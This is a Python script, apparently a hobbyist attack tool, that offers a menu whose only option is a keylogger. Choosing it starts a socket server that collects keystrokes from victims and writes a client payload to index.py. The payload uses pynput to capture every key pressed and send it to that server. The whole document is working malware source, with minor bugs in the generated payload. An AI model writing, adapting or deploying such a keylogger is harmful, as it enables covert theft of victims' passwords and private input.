def start():
    print('''
   _/                                _/  _/            _/  _/
_/_/_/_/    _/_/    _/_/_/  _/_/              _/_/_/  _/  _/
 _/      _/    _/  _/    _/    _/  _/  _/  _/_/      _/_/_/_/
_/      _/    _/  _/    _/    _/  _/  _/      _/_/      _/
 _/_/    _/_/    _/    _/    _/  _/  _/  _/_/_/        _/
    ''')

    print("1) Keylogger")
    print("2) Comming soon\n")
    select_target = input("Select attack: ")

    if(select_target == "1"):
        import socket
        import threading

        HEADER = 64
        PORT = 2356
        SERVER = socket.gethostbyname(socket.gethostname()) #! server IP 
        ADDR = (SERVER, PORT)
        FORMAT = "utf-8"
        DISCONECT_MESSAGE = "!DISCONECT"

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(ADDR)

        def handle_client(conn, addr):
            print(f"User {addr} was connected.") #! Targer IP
            
            connected = True
            while connected:
                msg_length = conn.recv(HEADER).decode(FORMAT)
                if msg_length:
                    msg_length = int(msg_length)
                    msg = conn.recv(msg_length).decode(FORMAT)
                    if msg == DISCONECT_MESSAGE:
                        connected = False
                
                    print(f"{addr}: {msg}") #! Targert IP
            conn.close()

        def start():
            server.listen()
            print(f"Server is running on {SERVER}") #! Server IP
            while True:
                conn, addr = server.accept()
                thread = threading.Thread(target=handle_client, args=(conn, addr))
                thread.start()
                print(f"[SERVER] Connected users: {threading.active_count() -1}")
        with open("index.py", "a+") as file:
            file.write("import socket\nfrom pynput import keyboard\nfrom datetime import date\nimport time\nHEADER = 64\nPORT = 2356\nDISCONECT_MESSAGE = \"!DISCONECT\"\nSERVER = \"socket.gethostbyname(socket.gethostname())\"\nADDR = (SERVER, PORT)\nFORMAT = \"utf-8\"\n\nclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nclient.connect(ADDR)\n\ndef send(msg):\n\tmessage = msg.encode(FORMAT)\n\tmsg_lenght = len(message)\n\tsend_lenght = str(msg_lenght).encode(FORMAT)\n\tsend_lenght += b\" \" * (HEADER - len(send_lenght))\n\tclient.send(send_lenght)\n\tclient.send(message)\n\ndef Keylogger():\n\tcurentDate = date.today()\n\tdateX = curentDate.strftime(\"%\d/%\m/%\Y\")\n\tdef on_release(key):\n\t\tlogs = \"\"\n\t\tlogs += str(key).replace(\"'\",\"\")\n\t\tif(str(key) == \"Key.esc\"):\n\t\t\treturn False\n\t\tsend(logs)\n\twith keyboard.Listener(on_release = on_release) as listener:\n\t\tlistener.join()\n\nKeylogger()")
        print("[SERVER] Server is starting..")
        start() #? Start server
start()